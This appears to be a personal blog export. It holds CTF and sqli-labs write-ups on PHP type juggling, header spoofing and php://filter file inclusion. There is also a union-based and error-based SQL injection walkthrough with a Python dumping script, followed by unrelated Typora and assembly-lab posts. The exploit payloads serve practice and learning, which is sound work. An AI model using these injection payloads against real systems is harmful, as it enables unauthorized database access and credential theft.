<p>在进行比较运算时，如果遇到了 0e 这类字符串，PHP会将它解析为 科学计数法</p>
<p>在进行比较运算时，如果遇到了 0x 这类字符串，PHP会将它解析为 十六进制 。</p>
</blockquote>
<p>然后经过大佬指点和我的测试，我发现只需要在19260817后面加上字母就行了:smile_cat:</p>
</li>
<li><p><code>$c != 240610708 and md5($c) == md5(240610708)</code></p>
<p>这个的话主要是md5值的知识，上网一查，md5(‘240610708’)等于md5(‘QNKCDZO’)，于是直接吧c赋值成后面那个字符串。</p>
</li>
<li><p><code>strlen($d) &lt; 7 and $d != 0 and $d ** 2 == 0</code></p>
<p>这个一开始是真的不会，后来还是一个学弟教我的，害。</p>
<p>考点应该是<strong>md5()函数无法处理数组，如果传入的为数组，会返回NULL</strong>（之前应该遇到过，忘记了。。。）</p>
<p>所以此处将d赋值成<code>d[]=0</code>,妙啊。</p>
<p>所以最终传参如下：</p>
<img src="/2020/08/14/moectf/image-20200921143630484.png" alt="image-20200921143630484" style="zoom:67%;"></li>
</ul>
<p>再贴一道与这道题很像的题：（来自CNSS）</p>
<pre><code class="line-numbers language-php">&lt;?php
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_POST['b'];
$c = $_REQUEST['c'];
$d = $_COOKIE['d'];

if (isset($a) &amp;&amp; !is_numeric($a) &amp;&amp; $a == 114514) {
    echo "A is ok!";
    if (isset($b) &amp;&amp; $b != 0 &amp;&amp; $b ** 2 == 0) {
        echo "B is ok!";
        if (isset($c) &amp;&amp; isset($d) &amp;&amp; $c !== $d &amp;&amp; md5($c) === md5($d)) {
            echo "C is ok!";
            echo "Here is your flag:";
            include('/flag');
        } else {
            die((isset($c) &amp;&amp; isset($d)) ? "Try to search something?" : "C and D is wanted.");
        }
    } else {
        die(isset($b) ? "You need to try again." : "B is wanted.");
    }
} else {
    die(isset($a) ? "Please try another a." : "A is wanted.");
} 
</code></pre>
<hr>
<h4 id="8-俄罗斯头套"><a href="#8-俄罗斯头套" class="headerlink" title="8.俄罗斯头套"></a>8.俄罗斯头套</h4><img src="/2020/08/14/moectf/image-20200814145058030.png" alt="image-20200814145058030" style="zoom:67%;">

<p>点进去后发现这样一句话，觉得应该得<strong>burpsuits</strong>伪造一波ip地址</p>
<p><img src="/2020/08/14/moectf/image-20200814145154603.png" alt="image-20200814145154603"></p>
<p>抓包后添加 <strong>X-Forwarded-For</strong>头，伪造一波ip地址，send一下，得到如下页面</p>
<img src="/2020/08/14/moectf/image-20200814145736400.png" alt="image-20200814145736400" style="zoom:50%;">

<p>然后注意到response里说我得是从<a href="https://www.baidu.com来的，根据之前的做题经验的话，再添加一个**Referer**头即可，如下：">https://www.baidu.com来的，根据之前的做题经验的话，再添加一个**Referer**头即可，如下：</a></p>
<img src="/2020/08/14/moectf/image-20200814150025874.png" alt="image-20200814150025874" style="zoom:50%;">

<p>发现<strong>response</strong>里又要求使用Post请求，这个之前的确没遇到过，观察了一波现有的头，发现第一个头是Get，尝试将其修改为Post后send一波，得到如下信息：</p>
<img src="/2020/08/14/moectf/image-20200814150414403.png" alt="image-20200814150414403" style="zoom:50%;">

<p>好吧，没完了，不愧是俄罗斯头套<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span>  不过supreme浏览器是什么鬼，我去百度了一波，靠，好像还真有这个浏览器，不会吧，不会吧，不会要去用这个浏览器去解题吧，那样还得重新配置<strong>burpsuits</strong>.</p>
<p>我去百度了一波burpsuits里浏览器是由哪个头去表示的，发现是由user-Agent去决定的，</p>
<img src="/2020/08/14/moectf/image-20200814150944737.png" alt="image-20200814150944737" style="zoom:50%;">

<p>仔细看了看burpsuits里那个头的内容，发现了一个Firefox，盲猜指的是所用的firefox浏览器，尝试将它改为题目中要求的supreme浏览器， 成功！</p>
<hr>
<h4 id="9-Moe-include"><a href="#9-Moe-include" class="headerlink" title="9.Moe include"></a>9.Moe include</h4><p>看这题目标题，应该和文件包含漏洞有关，点进去看一下：</p>
<p><img src="/2020/08/14/moectf/image-20200816140535894.png" alt="image-20200816140535894"></p>
<p>让我别点，那一定得点一下了<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">😝</span></p>
<img src="/2020/08/14/moectf/image-20200816140646912.png" alt="image-20200816140646912" style="zoom: 67%;">

<p>发现回显的页面为空，但是注意到url里多了一个<code>?file=hint.php</code></p>
<p>hint是提示的意思，访问hint.php试试，回显的依旧是空页面，抓包看看：</p>
<img src="/2020/08/14/moectf/image-20200816141033076.png" alt="image-20200816141033076" style="zoom:67%;">

<p>看到注释：<strong>你知道php伪协议吗？</strong></p>
<p>不知道的话可以参考参考这篇博客：<a href="https://www.cnblogs.com/zzjdbk/p/13030717.html"></a><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">php伪协议总结</a></p>
<p>文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码.结合之前的做题经验，尝试了一下用<code>php://filter</code>去读取文件</p>
<p>尝试构造如下paylaod:<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<img src="/2020/08/14/moectf/image-20200816142441015.png" alt="image-20200816142441015" style="zoom:67%;">

<p>然后对得到的字符串进行base64解密即可得到flag.<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8">😎</span></p>
<hr>
<h4 id="10-Moe-unserialize"><a href="#10-Moe-unserialize" class="headerlink" title="10.Moe unserialize"></a>10.Moe unserialize</h4><p>等待填坑</p>
<hr>
<h4 id="11-EzXXE"><a href="#11-EzXXE" class="headerlink" title="11.EzXXE"></a>11.EzXXE</h4><p>等待填坑</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs-master 刷题记录</title>
    <url>/2020/10/18/sqlilab/</url>
    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
<p>测试步骤：</p>
<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
<p>例如数字型语句：select * from table where id =3</p>
<p>则字符型如下：select * from table where name=’admin’</p>
<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
<p>测试步骤：</p>
<p>（1） 加单引号：select * from table where name=’admin’’</p>
<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
<p>Mysql 有三种常用注释符：</p>
<p>– 注意，这种注释符后边有一个空格</p>
<p># 通过#进行注释 即**%23**</p>
<p>/* */ 注释掉符号内的内容</p>
<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
<p><code>?id=1 order by 3--+</code></p>
<p>查看所有的数据库：</p>
<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
<p>查看所有的表：</p>
<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
<p>查看所有的字段：</p>
<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
<p>查看所有用户名和密码：</p>
<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
<p>（0x7e相当于’~’）</p>
<blockquote>
<p><strong>concat()函数</strong></p>
<p>功能：将多个字符串连接成一个字符串。</p>
<p>语法：concat(str1, str2,…)</p>
<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
<p>举例：</p>
<p>select concat (id, name, score) as info from tt2;</p>
<p><strong>concat_ws()函数</strong></p>
<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
<p>语法：concat_ws(separator, str1, str2, …)</p>
<p><strong>group_concat()函数</strong></p>
<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
</blockquote>
<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">

<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">

<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">

<p><strong>构造id=-1’)</strong></p>
<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
<blockquote>
<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
</blockquote>
<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
</code></pre>
<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
<pre><code class="line-numbers language-php">&lt;?php
$id=1;
$id = '"' . $id . '"';
echo($id);            //"1"
</code></pre>
<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
<p>构造**?id=-1”)** </p>
<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
<pre><code class="line-numbers language-python">import requests
from bs4 import BeautifulSoup
db_name = ''
table_list = []
column_list = []
url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
### 获取当前数据库名 ###
print('当前数据库名:')
payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
r = requests.get(url+payload)
db_name = r.text.split(':')[-2]
print('[+]' + db_name)
### 获取表名 ###
print('数据库%s下的表名:' % db_name)
for i in range(50):
    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
    r = requests.get(url+payload)
    if 'group_key' not in r.text:
        break
    table_name = r.text.split(':')[-2]
    table_list.append(table_name)
    print('[+]' + table_name)
### 获取列名 ###
#### 这里以users表为例 ####
print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
for i in range(50):
    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
    r = requests.get(url + payload)
    if 'group_key' not in r.text:
        break
    column_name = r.text.split(':')[-2]
    column_list.append(column_name)
    print('[+]' + column_name)
### 获取字段值 ###
#### 这里以username列为例 ####
print('%s列下的字段值:' % column_list[-2])
for i in range(50):
    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
    r = requests.get(url + payload)
    if 'group_key' not in r.text:
        break
    dump = r.text.split(':')[-2]
    print('[+]' + dump)
</code></pre>
<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试用typora写博客</title>
    <url>/2020/07/03/typora/</url>
    <content><![CDATA[<p>​    昨天花了一番时间搭建好博客后，匆匆用记事本写了一句话作为纪念，将其作为第一条博客测试了一下。成功了，但是总觉得那样写博客有些低效，而且怎么把它搞得花里胡哨呢:question:</p>
<span id="more"></span>

<p>​    在大佬的安利之下，我发现了 <strong>Trpora</strong> 这个强大的软件，今天就用它来写这篇博客。（第一次使用，用意不在内容，而是想测试一下各种花里胡哨的东西​ :smile:）</p>
<p>​    话不多说，测试开始</p>
<p>:boxing_glove:</p>
<ul>
<li><h4 id="首先，测试一下图片的插入-arrow-down-small"><a href="#首先，测试一下图片的插入-arrow-down-small" class="headerlink" title="首先，测试一下图片的插入:arrow_down_small:"></a>首先，测试一下图片的插入:arrow_down_small:</h4><p><img src="/2020/07/03/typora/wallhaven-ox7695.jpg"></p>
</li>
<li><p><img src="/2020/07/03/typora/wallhaven-49e9zx.jpg"></p>
</li>
</ul>
<p><strong>美汁儿汁儿</strong>:call_me_hand:</p>
<ul>
<li><h4 id="接着测试一下超链接"><a href="#接着测试一下超链接" class="headerlink" title="接着测试一下超链接"></a>接着测试一下超链接</h4><p><a href="http://www.baidu.com/">百度</a></p>
<p>ojbk:sunglasses:</p>
</li>
<li><h4 id="搞点代码恰恰-grey-question"><a href="#搞点代码恰恰-grey-question" class="headerlink" title="搞点代码恰恰:grey_question:"></a>搞点代码恰恰:grey_question:</h4><p><code>printf("hello world!");</code></p>
</li>
</ul>
<pre><code class="line-numbers language-c">#include &lt;stdio.h&gt;
int main()
{
    printf("welcome!");
}
</code></pre>
<ul>
<li><h4 id="再整个表？听说Typora这个功能很强啊-black-flag"><a href="#再整个表？听说Typora这个功能很强啊-black-flag" class="headerlink" title="再整个表？听说Typora这个功能很强啊 :black_flag:"></a>再整个表？听说Typora这个功能很强啊 <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f3f4.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3f4.png?v8">🏴</span></h4><p><code>ctrl+T</code> 插入表格</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>不知道该制个啥表，先空着吧，网上复制一个去(这功能tql)</p>
<p>好家伙，找半天，没找到合适的，，，，以后再说吧</p>
</li>
</ul>
<ul>
<li><h4 id="引用点东西水一水字数-cold-sweat"><a href="#引用点东西水一水字数-cold-sweat" class="headerlink" title="引用点东西水一水字数:cold_sweat:"></a>引用点东西水一水字数<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">😰</span></h4><blockquote>
<p>​        寂坐时，常想到晚明张岱。他写湖心亭：“崇祯五年十二月，余住西湖。大雪三日，湖中人鸟声俱绝。是日更定矣，余拿一小舟，拥毳衣炉火，独往湖心亭看雪。雾淞沆砀，天与云、与山、与水，上下一白。湖上影子，惟长堤一痕，湖心亭一点，与余舟一芥，舟中人两三粒而已。”</p>
<p>​        深夜独自到湖上看大雪，他显然不觉寂寞——寂寞可能是美学的必要。但是，国破家亡、人事全非、当他在为自己写墓志铭的时候呢？</p>
<p>​        蜀人张岱，陶庵其号也。少为纨绔子弟，极爱繁华，好精舍，好美婢，好娈童，好鲜衣，好美食，好骏马，好华灯，好烟火，好梨园，好鼓吹，好古董，好花鸟，兼以茶淫橘虐，书蠹诗魔，劳碌半生，皆成梦幻。年至五十，国破家亡，避迹山居。所存者，破床碎几，折鼎病琴与残书数帙，缺砚一方而已。布衣疏莨，常至断炊。回首二十年前，真如隔世。</p>
<p>​        有一种寂寞，身边添一个可谈的人，一条知心的狗，或许就可以消减。有一种寂寞，茫茫天地之间“余舟一芥”的无边无际无着落，或许只能各自孤独面对，素颜修行吧。</p>
<p>​                                                                                                                                                            ——龙应台《寂寞》</p>
</blockquote>
<hr>
<p>OK，测试暂且到这吧，以后常用的大概就这些了。U1S1，Typora的确是个宝藏软件<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f595.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f595.png?v8">🖕</span></p>
</li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>【NJUPT】微机实验（合集）</title>
    <url>/2021/07/09/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="1-修改一个有语法错误的汇编语言源程序"><a href="#1-修改一个有语法错误的汇编语言源程序" class="headerlink" title="1.修改一个有语法错误的汇编语言源程序"></a>1.修改一个有语法错误的汇编语言源程序</h3><h4 id="原来有错误的代码："><a href="#原来有错误的代码：" class="headerlink" title="原来有错误的代码："></a>原来有错误的代码：</h4><pre><code>.486
DATA SEGMENT USE16
     SUM DB ?,?,
     MESG DB '25+9=' 
     DB 0,0
     N1 DB 9,F0H
     N2 DW 25
DATA ENDS

CODE SEGMENT USE16
    ASSUME CS:CODE,DS:DATA
BEG:
    MOV AX,DATA
    MOV DS,AX
    MOV BX,OFFSET SUM
    MOV AH,N1
    MOV AL,N2
    ADD AH,AL
    MOV [BX],AH
    CALL CHANG
    MOV AH,9
    MOV DX,OFFSET MEST
    INT 21H
    MOV AH,4CH
    INT 21H

CHANG: PROC
LAST:
    CMP [BX],10
    JC  NEXT
    SUB [BX],10
    INC [BX+7]
    JMP LAST
NEXT:
    ADD [BX+8],SUM
    ADD [BX+7],30H
    ADD [BX+8],30H
    RET
CHANG: ENDP

CODE ENDS
    END BEG

</code></pre>
<h4 id="修改后的代码："><a href="#修改后的代码：" class="headerlink" title="修改后的代码："></a>修改后的代码：</h4><pre><code>.586
DATA SEGMENT USE16
     SUM DB ?,?  ;改动
     MESG DB '25+9=' 
          DB 0,0,'$';结束标志
     N1 DB 9,0F0H  ;前面加0
     N2 DB 25  ;DW改成DB
DATA ENDS

CODE SEGMENT USE16
    ASSUME CS:CODE,DS:DATA
BEG:
    MOV AX,DATA
    MOV DS,AX
    MOV BX,OFFSET SUM
    MOV AH,N1
    MOV AL,N2
    ADD AH,AL
    MOV [BX],AH

    CALL CHANG
    
    MOV AH,9
    MOV DX,OFFSET MESG
    INT 21H
    MOV AH,4CH
    INT 21H

CHANG PROC
LAST:
    CMP BYTE PTR [BX],10   ;34
    JC  NEXT              ;小于10跳转到NEXT
    SUB BYTE PTR [BX],10  ;减10
    INC BYTE PTR [BX+7]   ;十位加1
    JMP LAST
NEXT:
    MOV AH,SUM
    ADD [BX+8],AH
    ;ADD [BX+8],SUM  ;源操作数和目的操作数不能同时为寄存器
    ADD BYTE PTR [BX+7],30H  ;长度不相同，[BX+7]对应十位，加30H便是0~9的ASCII码
    ADD BYTE PTR [BX+8],30H  ;[Bx+8]对应个位
    RET
CHANG ENDP

CODE ENDS
    END BEG

</code></pre>
<h3 id="2-设计汇编程序实现数据的查找、统计，代码转换及屏幕显示等功能"><a href="#2-设计汇编程序实现数据的查找、统计，代码转换及屏幕显示等功能" class="headerlink" title="2.设计汇编程序实现数据的查找、统计，代码转换及屏幕显示等功能"></a>2.设计汇编程序实现数据的查找、统计，代码转换及屏幕显示等功能</h3><blockquote>
<p>【实验2.9】从BUF单元开始存有一字符串（长度&lt;255）,编程实现统计该字符串中的ASCII码在42H~45H之间的字符个数，并将统计结果以二进制形式显示在屏幕上。</p>
</blockquote>
<pre><code>三、实验原理及内容
○1【实验1.2】排除语法错误
原来有错误的代码：
.486
DATA SEGMENT USE16
     SUM DB ?,?,
     MESG DB '25+9=' 
     DB 0,0
     N1 DB 9,F0H
     N2 DW 25
DATA ENDS

CODE SEGMENT USE16
    ASSUME CS:CODE,DS:DATA
BEG:
    MOV AX,DATA
    MOV DS,AX
    MOV BX,OFFSET SUM
    MOV AH,N1
    MOV AL,N2
    ADD AH,AL
    MOV [BX],AH
    CALL CHANG
    MOV AH,9
    MOV DX,OFFSET MEST
    INT 21H
    MOV AH,4CH
    INT 21H

CHANG: PROC
LAST:
    CMP [BX],10
    JC  NEXT
    SUB [BX],10
    INC [BX+7]
    JMP LAST
NEXT:
    ADD [BX+8],SUM
    ADD [BX+7],30H
    ADD [BX+8],30H
    RET
CHANG: ENDP

CODE ENDS
    END BEG


修改后的代码：

.586
DATA SEGMENT USE16
     SUM DB ?,?  ;改动
     MESG DB '25+9=' 
          DB 0,0,'$';结束标志
     N1 DB 9,0F0H  ;前面加0
     N2 DB 25  ;DW改成DB
DATA ENDS

CODE SEGMENT USE16
    ASSUME CS:CODE,DS:DATA
BEG:
    MOV AX,DATA
    MOV DS,AX
    MOV BX,OFFSET SUM
    MOV AH,N1
    MOV AL,N2
    ADD AH,AL
    MOV [BX],AH

    CALL CHANG
    
    MOV AH,9
    MOV DX,OFFSET MESG
    INT 21H
    MOV AH,4CH
    INT 21H

CHANG PROC
LAST:
    CMP BYTE PTR [BX],10   ;34
    JC  NEXT              ;小于10跳转到NEXT
    SUB BYTE PTR [BX],10  ;减10
    INC BYTE PTR [BX+7]   ;十位加1
    JMP LAST
NEXT:
    MOV AH,SUM
    ADD [BX+8],AH
    ;ADD [BX+8],SUM  ;源操作数和目的操作数不能同时为寄存器
    ADD BYTE PTR [BX+7],30H  ;长度不相同，[BX+7]对应十位，加30H便是0~9的ASCII码
    ADD BYTE PTR [BX+8],30H  ;[Bx+8]对应个位
    RET
CHANG ENDP

CODE ENDS
    END BEG


○2【实验2.9】从BUF单元开始存有一字符串（长度&lt;255）,编程实现统计该字符串中的ASCII码在42H~45H之间的字符个数，并将统计结果以二进制形式显示在屏幕上。
.486
DATA SEGMENT USE16
BUF DB 'ABCDEFGEB'
COUNT EQU $-BUF 
DATA ENDS
CODE SEGMENT USE16
    ASSUME CS:CODE,DS:DATA

BEG:    MOV AX,DATA
        MOV DS,AX          ;DS而不是DX ！！！！
        MOV BX,OFFSET BUF
        MOV CX,COUNT
        MOV DL,0

LAST:   CMP BYTE PTR[BX],42H  ;小于42H跳转
        JC NEXT
        CMP BYTE PTR[BX],45H  ;大于45H跳转
        JA NEXT
        INC DL
        
NEXT:   INC BX
        LOOP LAST

        CALL DISP
        ; ADD DL,30H        ;显示十进制
        ; MOV AH,2
        ; INT 21H
EXIT:   MOV AH,4CH
        INT 21H
     ;-------------------------
DISP    PROC
        MOV CX,8
        MOV BL,DL
A0:     
        RCL BL,1
        JNC A1        ;若进位标志为0，则跳转到A1
        MOV DL,'1'    ;进位标志不为0，将DL赋'1'
        JMP NEXT2     ;无条件跳转
A1:     MOV DL,'0'    ;将DL赋'0'
NEXT2:  
        MOV AH,2      ;每次循环显示一次DL里的字符
        INT 21H
        LOOP A0
        RET
DISP ENDP
    
CODE ENDS
     END BEG
</code></pre>
<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><blockquote>
<p>实验要求</p>
<ul>
<li><p>程序执行后，给出操作提示，请用户键入用户名和密码。</p>
</li>
<li><p>用户在键入密码时，程序不回显键入字符。</p>
</li>
<li><p>只有当用户键入的用户和密码字符串和程序内定的字符串相同时，显示欢迎界面，并返回DOS。</p>
</li>
<li><p>可对密码进行加密和解密；动画显示欢迎界面。（选做）</p>
</li>
</ul>
</blockquote>
<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><pre><code>三、实验原理及内容
1.源代码：
.586
DATA SEGMENT USE16
MESG1 DB 'Please enter username:'
COUNT1 EQU $-MESG1     ;获取长度
USER  DB 'NJUPT'
COUNT2 EQU $-USER
PASS  DB '122333'
COUNT3 EQU $-PASS
ERROR  DB '                               Wrong!try again!$';为了显得居中
COUNT4 EQU $-ERROR
MESG2 DB 'Please enter password:'
COUNT5 EQU $-MESG2
MESG3 DB '---- WELCOME! ----'
COUNT6 EQU $-MESG3

BUF1 DB 30         ;数据缓冲区
     DB ?
     DB 30 DUP(?)
BUF2 DB 30         ;数据缓冲区
     DB ?
     DB 30 DUP(?)
    
DATA ENDS
CODE SEGMENT USE16
    ASSUME CS:CODE,DS:DATA,ES:DATA 
BEG: MOV AX,DATA
     MOV DS,AX
     MOV ES,AX
     MOV AX,0003H   ;80列x25行彩色文本方式
     INT 10H
USERNAME:   MOV AX,1301H  ;显示彩色字符串"Please enter username:"
            MOV BH,0
            MOV BL,0AH
            MOV CX,COUNT1
            MOV DH,2
            MOV DL,(80-COUNT1)/2  ;居中显示
            MOV BP,OFFSET MESG1
            INT 10H
RUSER: MOV CX,COUNT2           ;键盘读入用户名
       MOV AH,0AH
       MOV DX,OFFSET BUF1
       INT 21H
       MOV CL,BUF1+1
       MOV CH,0
       CMP CX,COUNT2
       JNZ WRONGUSER
       MOV SI,OFFSET BUF1+2
       MOV DI,OFFSET USER
       CLD

       MOV AX,2H    ;清屏
       MOV BH,0
       MOV DH,0
       MOV DL,0

LOAD:  REPE CMPSB      ;两字符串比较
       JZ PASSWORD     ;相等的话跳转到password
       
WRONGUSER: 
     MOV AH,2
     MOV DL,0AH
     INT 21H  
      
     MOV AH,2
     MOV DL,0AH
     INT 21H
     MOV AX,2H           ;清屏  
     MOV BH,0
     MOV DH,0
     MOV DL,0
     INT 10H  
     MOV AH,9             ;黑白显示
     MOV DX,OFFSET ERROR
     INT 21H
  

     JMP USERNAME         ;跳转到USERNAME，让用户重新输入用户名
     
     
PASSWORD:          ;与用户名代码类似
     INT 10H  
     MOV AX,1301H
            MOV BH,0
            MOV BL,0AH
            MOV CX,COUNT5
            MOV DH,2
            MOV DL,(80-COUNT5)/2
            MOV BP,OFFSET MESG2
            INT 10H
            MOV BX,OFFSET BUF2
            MOV CX,0

LAST2:
     MOV AH,07H  ;不回显字符
     INT 21H     ;光标下移一行
     MOV [BX],AL ;低位传给BX
     MOV DH,AL    ;提前把AL寄存器里的字符备份，否则用了02H会破坏掉AL寄存器里的内容
     MOV AH,02H  ;显示 *
     MOV DL,'*'  
     INT 21H
     INC BX      ;BX后移一位,一共移CX次
     INC CX
     CMP DH,0DH
     JNZ LAST2
     DEC CX      ;减一是因为回车使CX+1了，实际CX值应该减掉1
     
     MOV DI,OFFSET BUF2
